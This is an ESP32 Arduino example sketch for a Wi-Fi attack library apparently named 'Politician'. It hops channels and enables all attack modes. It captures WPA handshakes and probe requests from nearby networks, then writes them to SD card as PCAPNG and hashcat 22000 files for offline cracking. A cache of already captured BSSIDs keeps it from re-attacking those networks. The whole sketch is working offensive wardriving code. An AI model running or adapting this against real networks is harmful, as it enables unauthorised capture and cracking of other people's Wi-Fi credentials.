#include <Arduino.h>
#include <SD.h>
#include <SPI.h>
#include <Politician.h>
#include <PoliticianStorage.h>

using namespace politician;
using namespace politician::storage;

Politician engine;
NvsBssidCache nvsCache("wardrive");

// Change to your SD card's Chip Select pin
const int SD_CS_PIN = 5;

void onPacket(const uint8_t *payload, uint16_t len, int8_t rssi, uint32_t ts_usec) {
    // This callback receives all frames strictly matching your `capture_filter`.
    // It seamlessly creates a second PCAPNG file strictly containing raw Air Intel.
    PcapngFileLogger::appendPacket(SD, "/intel.pcapng", payload, len, rssi, ts_usec);
}

void onHandshake(const HandshakeRecord &rec) {
    Serial.printf("\n[!] HANDSHAKE CAPTURED: %s\n", rec.ssid);

    // 1. Save to SD as PCAPNG automatically formatting the headers if missing
    if (PcapngFileLogger::append(SD, "/captures.pcapng", rec)) {
        Serial.println("  -> Appended to /captures.pcapng on SD Card.");
    } else {
        Serial.println("  -> Failed to append PCAPNG.");
    }

    // 2. Save to SD as HC22000
    if (Hc22000FileLogger::append(SD, "/captures.22000", rec)) {
        Serial.println("  -> Appended to /captures.22000 on SD Card.");
    } else {
        Serial.println("  -> Failed to append HC22000.");
    }

    // 3. Add to NVS cache so we don't attack it again on the next reboot
    if (nvsCache.add(rec.bssid)) {
        Serial.println("  -> BSSID stored in NVS successfully.");
        // Also inform the active engine instance directly so it stops
        engine.markCaptured(rec.bssid);
    }
}

void setup() {
    Serial.begin(115200);
    delay(1000);
    Serial.println("\n--- Politician SD & NVS Storage Example ---");

    // Initialize SD Card
    if(!SD.begin(SD_CS_PIN)){
        Serial.println("SD Card Mount Failed! Ensure it is connected.");
    } else {
        Serial.println("SD Card initialized.");
    }

    // Initialize the NVS cache and load stored BSSIDs
    nvsCache.begin();
    Serial.println("NVS Cache loaded from Preferences.");

    // Setup Engine Callbacks
    engine.setEapolCallback(onHandshake);
    engine.setPacketLogger(onPacket); // Wire up the Raw Packet Filter sniffer

    Config cfg;
    // Tell the engine exactly what to log to `onPacket`. 
    // Here we tell it to only capture Probes (Scouting) and Handshakes.
    cfg.capture_filter = LOG_FILTER_PROBES | LOG_FILTER_HANDSHAKES;

    if (engine.begin(cfg) != politician::OK) {
        Serial.println("WiFi Init Failed!");
        while(1) delay(100);
    }
    
    // Inject the NVS BSSIDs into the Politician engine so it ignores them
    nvsCache.loadInto(engine);

    // Start Attack sequence
    engine.startHopping();
    engine.setActive(true);
    engine.setAttackMask(ATTACK_ALL);

    Serial.println("Wardriving started...");
}

void loop() {
    engine.tick();
}
